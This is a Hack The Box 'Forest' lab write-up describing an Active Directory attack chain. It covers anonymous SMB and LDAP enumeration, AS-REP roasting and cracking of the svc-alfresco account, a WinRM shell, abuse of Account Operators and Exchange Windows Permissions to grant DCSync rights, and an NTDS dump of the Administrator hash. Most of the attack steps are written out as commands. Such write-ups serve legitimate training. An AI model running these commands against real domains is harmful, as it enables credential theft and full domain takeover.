---
title: HTB Forest
slug: forest
lang: en
platform: Hack The Box
category: Active Directory
headline: AS-REP roasting, Account Operators abuse and DCSync through Exchange permissions
difficulty: Easy
objective: Domain Admin
date: 2026-05-11
tags: [Active Directory, AS-REP Roasting, BloodHound, DCSync, Exchange Windows Permissions]
---

# HTB Forest

## Executive Summary

Forest exposes enough unauthenticated SMB and LDAP information to enumerate domain users. The `svc-alfresco` service account does not require Kerberos pre-authentication, making it vulnerable to AS-REP roasting. After cracking the password, WinRM access is obtained. Because the account belongs to Account Operators, it can create a domain user and add it to Exchange Windows Permissions. With delegated DACL rights, the attacker grants DCSync privileges and extracts the Administrator hash.

## Enumeration

The machine exposes a classic Windows domain controller surface: DNS, Kerberos, LDAP, SMB, WinRM and AD Web Services.

![[Pasted image 20260511183406.png|Forest attack path summary]]

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.65.162 -oG allPorts
sudo nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49681,49698 -sCV -vvv 10.129.65.162 -oN Targeted
```

Anonymous SMB enumeration returned a list of domain users.

```bash
nxc smb 10.129.65.162 -u '' -p '' --users
```

![[Pasted image 20260511144932.png|Anonymous SMB user enumeration]]

The initial user list was saved for roasting attempts.

![[Pasted image 20260511145316.png|Users saved to file]]

LDAP anonymous queries were also allowed.

```bash
ldapsearch -x -H ldap://10.129.65.162:389 -b 'dc=htb,dc=local'
ldapsearch -x -H ldap://10.129.65.162:389 -b 'dc=htb,dc=local' "(objectClass=*)" sAMAccountName | grep sAMAccountName
```

![[Pasted image 20260511145704.png|Anonymous LDAP query]]

The `svc-alfresco` account was confirmed as a service account.

![[Pasted image 20260511150528.png|svc-alfresco service account]]

## AS-REP Roasting

`svc-alfresco` did not require Kerberos pre-authentication, allowing AS-REP roasting.

```bash
GetNPUsers.py -dc-ip 10.129.65.162 htb.local/ -no-pass -usersfile users.txt
```

The resulting AS-REP material was cracked offline with John.

```bash
john --format=krb5asrep --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt svc-alfresco.tgt
john --show svc-alfresco.tgt
```

```text
svc-alfresco:s3rvice
```

![[Pasted image 20260511151442.png|AS-REP hash saved]]
![[Pasted image 20260511152115.png|svc-alfresco password cracked]]
![[Pasted image 20260511152352.png|Credentials validated]]

## BloodHound and WinRM Access

BloodHound collection showed that `svc-alfresco` was a member of Account Operators.

![[Pasted image 20260511152703.png|BloodHound collection]]
![[Pasted image 20260511153140.png|BloodHound import]]
![[Pasted image 20260511160831.png|Potential Exchange Windows Permissions path]]
![[Pasted image 20260511161718.png|Account Operators membership]]
![[Pasted image 20260511162020.png|BloodHound relationship detail]]

WinRM was available for the compromised account.

```bash
evil-winrm -i 10.129.65.162 -u 'svc-alfresco' -p 's3rvice'
```

![[Pasted image 20260511162317.png|WinRM validation]]
![[Pasted image 20260511162559.png|WinRM shell as svc-alfresco]]

## DCSync Path

A new domain user was created and added to Exchange Windows Permissions.

```cmd
net user met4ll0f Password123! /add /domain
net group "Exchange Windows Permissions" met4ll0f /add
```

![[Pasted image 20260511162902.png|Domain user creation]]
![[Pasted image 20260511163109.png|Added to Exchange Windows Permissions]]

WriteDACL rights were then abused to grant DCSync permissions.

![[Pasted image 20260511163940.png|Granting DCSync rights]]

The NTDS dump produced the Administrator hash.

```bash
nxc smb 10.129.65.162 -u 'met4ll0f' -p 'Password123!' --ntds
```

![[Pasted image 20260511164542.png|NTDS dump with Administrator hash]]

The hash was used for an Administrator login.

![[Pasted image 20260511165105.png|Administrator login]]

## Key Takeaways

- Anonymous LDAP/SMB enumeration can provide enough data for a full AD attack path.
- Service accounts without Kerberos pre-authentication are high-risk.
- Account Operators can create and modify objects in ways that enable privilege escalation.
- Exchange Windows Permissions plus WriteDACL abuse can lead directly to DCSync.
